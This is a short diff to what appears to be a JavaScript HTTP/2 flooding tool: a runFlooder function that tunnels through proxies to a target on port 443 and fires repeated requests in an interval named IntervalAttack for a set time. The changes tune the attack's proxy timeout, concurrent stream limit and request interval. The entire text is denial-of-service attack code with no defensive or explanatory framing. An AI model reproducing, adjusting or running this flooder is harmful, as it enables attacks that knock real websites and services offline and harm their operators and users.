@@ -201,7 +201,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
-        timeout: 10
+        timeout: 5
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
@@ -252,7 +252,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 1000,
+                maxConcurrentStreams: 112,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536,
                 enablePush: false
@@ -278,7 +278,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 224);
+            }, 100);
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
